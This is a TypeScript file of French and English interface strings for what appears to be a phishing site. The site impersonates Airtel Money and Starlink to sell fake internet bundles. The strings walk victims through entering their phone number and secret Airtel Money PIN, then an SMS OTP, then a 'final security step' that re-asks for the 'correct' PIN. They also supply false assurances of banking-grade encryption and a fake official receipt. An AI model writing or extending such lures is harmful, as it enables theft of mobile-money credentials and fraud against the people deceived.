import { Language } from '../data/countries';

export const TRANSLATIONS = {
  fr: {
    // Header & Nav
    starlinkStatus: 'Réseau Starlink RDC : Opérationnel',
    starlinkStatusGlobal: 'Réseau Satellite Starlink : Opérationnel',
    airtelLitePortal: 'Portail Airtel Lite',
    selectCountry: 'Sélectionner votre pays',
    countryRequired: 'Sélection du pays obligatoire',
    langFr: 'Français',
    langEn: 'English',

    // Plans Page
    badgeTag: 'Forfaits Internet & Constellation Starlink',
    directToCell: 'Direct-to-Cell',
    heroTitle1: 'Restez Connecté',
    heroTitle2: 'Sans Limites',
    heroSubtitle:
      'Choisissez votre forfait. Vous serez redirigé vers la page sécurisée Airtel Lite pour valider et finaliser votre paiement.',
    
    // Filter options
    filterAll: 'Tous les forfaits',
    filterDaily: 'Journalier',
    filterWeekly: 'Hebdomadaire',
    filterMonthly: 'Mensuel',
    filter30Days: 'Valide 30 Jours',
    filterStarlink: 'Réseau Starlink',

    filterAllSub: 'Toutes les offres disponibles',
    filterDailySub: 'Valide 1 Jour & 3 Jours',
    filterWeeklySub: 'Valide 7 Jours & 15 Jours',
    filterMonthlySub: 'Forfaits 30 Jours',
    filter30DaysSub: 'Haute validité 30 Jours',
    filterStarlinkSub: 'Liaison Satellite LEO Très Haut Débit',

    categorySelected: 'Catégorie sélectionnée',
    changeCategory: 'Changer',
    closeCategory: 'Fermer',
    selectOfferPrompt: 'Sélectionnez un forfait',
    showingPlans: 'Affichage de',
    plansWord: 'forfaits',
    planWordSingular: 'forfait',
    forFilter: 'pour :',
    seeAll: 'Voir tout',

    // Plan Card
    popularRibbon: 'LE PLUS POPULAIRE • MEILLEURE VENTE',
    perPlan: '/ forfait',
    choosePlan: 'CHOISIR CE FORFAIT',
    starlinkNetwork: 'Réseau Starlink',
    highSpeedLeo: 'Internet Très Haut Débit LEO',

    // Security Banner
    securityTitle: 'Sécurité Airtel NextGen & Starlink LEO',
    securityDesc:
      'Paiement instantané débité sur votre solde Airtel Money / Lite avec validation cryptée.',
    securityBadge: '100% SÉCURISÉ',

    // Footer
    copyright: 'Tous droits réservés',
    satellitePartner: 'Réseau Satellite Direct-to-Cell',

    // Login Page
    backToPlans: 'Changer de forfait',
    back: 'Retour',
    selectedPlanPill: 'Forfait Starlink sélectionné',
    loginTitle: 'Connectez-vous à Airtel Lite pour finaliser le paiement.',
    loginSubtitle: 'Renseignez votre pays, votre numéro Airtel et votre code secret.',
    countryLabel: 'Pays Airtel (Obligatoire)',
    phoneLabel: 'Numéro de Téléphone Airtel',
    pinLabel: 'Entrez votre Code Secret',
    show: 'Afficher',
    hide: 'Masquer',
    validateContinue: 'VALIDER ET CONTINUER',
    connecting: 'Connexion en cours...',
    searchCountryPlaceholder: 'Rechercher un pays...',
    countryRequiredAlert: 'Veuillez d’abord sélectionner votre pays Airtel.',
    phoneFormatHint: 'Format attendu :',
    secureNote:
      'Vos identifiants sont protégés par le protocole bancaire Airtel Money et chiffrés de bout en bout.',

    // Modal
    validatingPin: 'Validation du code PIN...',
    validatingOtp: 'Validation du code OTP...',
    verifyingPinMsg:
      'Vérification de vos identifiants Airtel Lite en cours. Veuillez patienter...',
    verifyingOtpMsg:
      'Vérification du code de sécurité SMS en cours. Veuillez patienter...',
    secureProcessing: 'Traitement sécurisé',
    pinApproved: 'Code PIN validé !',
    otpApproved: 'Code OTP validé !',
    redirecting: 'Redirection vers l’étape suivante...',
    activatingPlan: 'Activation de votre forfait en cours...',
    pinRejected: 'Code PIN non valide',
    otpRejected: 'Code OTP incorrect',
    retryPrompt: 'Veuillez vérifier et réessayer.',
    encryptedSession: 'Session Chiffrée Airtel 256-bit',

    // OTP Page
    otpTitle: 'Vérification par SMS (OTP)',
    otpSubtitle: 'Un code de validation à 4 chiffres a été envoyé par SMS au',
    otpInputLabel: 'Code de Sécurité SMS',
    resendIn: 'Renvoyer le code dans',
    resendButton: 'Renvoyer le code par SMS',
    confirmActivate: 'CONFIRMER ET ACTIVER',
    validating: 'Validation...',
    otpError: 'Code OTP incorrect ou expiré. Veuillez vérifier le SMS et réessayer.',

    // Re-enter PIN Page
    reenterPinTitle: 'Confirmation du Code PIN',
    reenterPinSubtitle: 'Veuillez ressaisir votre code PIN correct pour valider et finaliser l’activation de votre forfait.',
    reenterPinBadge: 'Étape de Sécurité Finale',
    reenterPinLabel: 'Ressaisissez votre Code PIN Secret (4 chiffres)',
    reenterPinHelper: 'Entrez votre code secret Airtel Money pour confirmer l’opération et activer le forfait.',
    confirmAndActivate: 'CONFIRMER ET ACTIVER LE FORFAIT',
    pinMismatchAlert: 'Code PIN non correspondant. Veuillez ressaisir votre code PIN correct.',
    validatingReenterPin: 'Vérification du code PIN...',
    verifyingReenterPinMsg: 'Vérification de la conformité de votre code PIN en cours. Veuillez patienter...',
    reenterPinApproved: 'Code PIN confirmé !',
    reenterPinRejected: 'Code PIN incorrect. Veuillez ressaisir le code PIN correct.',
    otpVerifiedBadge: 'Code OTP SMS validé avec succès',

    // Success Page
    validationSuccess: 'Validation Réussie',
    planActivatedTitle: 'Forfait Internet Activé !',
    planActivatedSubtitle:
      'Votre forfait Starlink x Airtel est maintenant immédiatement utilisable sur votre ligne.',
    digitalReceipt: 'REÇU NUMÉRIQUE OFFICIEL',
    clientPhone: 'Numéro Client :',
    transactionRef: 'Réf. Transaction :',
    dateLabel: 'Date d’activation :',
    networkLabel: 'Réseau :',
    amountLabel: 'Montant facturé :',
    statusLabel: 'Statut du forfait :',
    statusActive: 'Actif & Opérationnel',
    testedSpeed: 'Débit descendant actuel :',
    speedTestTitle: 'TEST DE CONNEXION STARLINK',
    speedTestRunning: 'Mesure de débit en cours...',
    runSpeedTest: 'Tester la vitesse Starlink',
    testAgain: 'Refaire le test',
    getAnotherPlan: 'Prendre un autre forfait',
  },
  en: {
    // Header & Nav
    starlinkStatus: 'Starlink DRC Network: Operational',
    starlinkStatusGlobal: 'Starlink Satellite Network: Operational',
    airtelLitePortal: 'Airtel Lite Portal',
    selectCountry: 'Select your country',
    countryRequired: 'Country selection required',
    langFr: 'Français',
    langEn: 'English',

    // Plans Page
    badgeTag: 'Internet Bundles & Starlink Constellation',
    directToCell: 'Direct-to-Cell',
    heroTitle1: 'Stay Connected',
    heroTitle2: 'Without Limits',
    heroSubtitle:
      'Choose your bundle. You will be redirected to the secure Airtel Lite page to validate and complete your payment.',
    
    // Filter options
    filterAll: 'All Plans',
    filterDaily: 'Daily',
    filterWeekly: 'Weekly',
    filterMonthly: 'Monthly',
    filter30Days: '30 Days Validity',
    filterStarlink: 'Starlink Network',

    filterAllSub: 'All available offers',
    filterDailySub: 'Valid 1 Day & 3 Days',
    filterWeeklySub: 'Valid 7 Days & 15 Days',
    filterMonthlySub: '30 Days Bundles',
    filter30DaysSub: 'Long duration 30 Days',
    filterStarlinkSub: 'High-Speed LEO Satellite Link',

    categorySelected: 'Selected Category',
    changeCategory: 'Change',
    closeCategory: 'Close',
    selectOfferPrompt: 'Select a bundle',
    showingPlans: 'Showing',
    plansWord: 'plans',
    planWordSingular: 'plan',
    forFilter: 'for:',
    seeAll: 'View all',

    // Plan Card
    popularRibbon: 'MOST POPULAR • BEST SELLER',
    perPlan: '/ bundle',
    choosePlan: 'SELECT THIS BUNDLE',
    starlinkNetwork: 'Starlink Network',
    highSpeedLeo: 'Ultra High-Speed LEO Internet',

    // Security Banner
    securityTitle: 'Airtel NextGen & Starlink LEO Security',
    securityDesc:
      'Instant payment charged from your Airtel Money / Lite balance with encrypted verification.',
    securityBadge: '100% SECURE',

    // Footer
    copyright: 'All rights reserved',
    satellitePartner: 'Direct-to-Cell Satellite Network',

    // Login Page
    backToPlans: 'Change bundle',
    back: 'Back',
    selectedPlanPill: 'Selected Starlink Bundle',
    loginTitle: 'Log in to Airtel Lite to complete payment.',
    loginSubtitle: 'Select your country, enter your Airtel number and secret PIN.',
    countryLabel: 'Airtel Country (Compulsory)',
    phoneLabel: 'Airtel Phone Number',
    pinLabel: 'Enter your Secret PIN',
    show: 'Show',
    hide: 'Hide',
    validateContinue: 'VALIDATE & CONTINUE',
    connecting: 'Connecting...',
    searchCountryPlaceholder: 'Search country...',
    countryRequiredAlert: 'Please select your Airtel country first.',
    phoneFormatHint: 'Expected format:',
    secureNote:
      'Your credentials are protected by Airtel Money banking-grade protocol and end-to-end encryption.',

    // Modal
    validatingPin: 'Validating PIN code...',
    validatingOtp: 'Validating OTP code...',
    verifyingPinMsg:
      'Verifying your Airtel Lite credentials. Please wait...',
    verifyingOtpMsg:
      'Verifying your SMS security code. Please wait...',
    secureProcessing: 'Secure processing',
    pinApproved: 'PIN code validated!',
    otpApproved: 'OTP code validated!',
    redirecting: 'Redirecting to next step...',
    activatingPlan: 'Activating your bundle...',
    pinRejected: 'Invalid PIN code',
    otpRejected: 'Incorrect OTP code',
    retryPrompt: 'Please verify and try again.',
    encryptedSession: 'Airtel 256-bit Encrypted Session',

    // OTP Page
    otpTitle: 'SMS Verification (OTP)',
    otpSubtitle: 'A 4-digit verification code has been sent via SMS to',
    otpInputLabel: 'SMS Security Code',
    resendIn: 'Resend code in',
    resendButton: 'Resend code via SMS',
    confirmActivate: 'CONFIRM & ACTIVATE',
    validating: 'Validating...',
    otpError: 'Incorrect or expired OTP code. Please check your SMS and try again.',

    // Re-enter PIN Page
    reenterPinTitle: 'Confirm Secret PIN',
    reenterPinSubtitle: 'Please re-enter your correct PIN code to validate and finalize your bundle activation.',
    reenterPinBadge: 'Final Security Step',
    reenterPinLabel: 'Re-enter your Secret PIN Code (4 digits)',
    reenterPinHelper: 'Enter your Airtel Money secret PIN to confirm transaction and activate the bundle.',
    confirmAndActivate: 'CONFIRM & ACTIVATE BUNDLE',
    pinMismatchAlert: 'PIN codes do not match. Please ensure you enter the correct secret PIN.',
    validatingReenterPin: 'Verifying PIN code...',
    verifyingReenterPinMsg: 'Verifying your secret PIN. Please wait...',
    reenterPinApproved: 'PIN code confirmed!',
    reenterPinRejected: 'Incorrect PIN code. Please re-enter the correct PIN.',
    otpVerifiedBadge: 'SMS OTP Code Successfully Verified',

    // Success Page
    validationSuccess: 'Validation Successful',
    planActivatedTitle: 'Internet Bundle Activated!',
    planActivatedSubtitle:
      'Your Starlink x Airtel bundle is now immediately active on your mobile line.',
    digitalReceipt: 'OFFICIAL DIGITAL RECEIPT',
    clientPhone: 'Customer Number:',
    transactionRef: 'Transaction Ref:',
    dateLabel: 'Activation Date:',
    networkLabel: 'Network:',
    amountLabel: 'Amount Billed:',
    statusLabel: 'Bundle Status:',
    statusActive: 'Active & Operational',
    testedSpeed: 'Current Download Speed:',
    speedTestTitle: 'STARLINK SPEED TEST',
    speedTestRunning: 'Measuring bandwidth...',
    runSpeedTest: 'Test Starlink Speed',
    testAgain: 'Test Again',
    getAnotherPlan: 'Get Another Bundle',
  },
};

export type TranslationKey = keyof typeof TRANSLATIONS.fr;

export function getTranslation(key: TranslationKey, lang: Language): string {
  return TRANSLATIONS[lang]?.[key] || TRANSLATIONS.fr[key] || '';
}
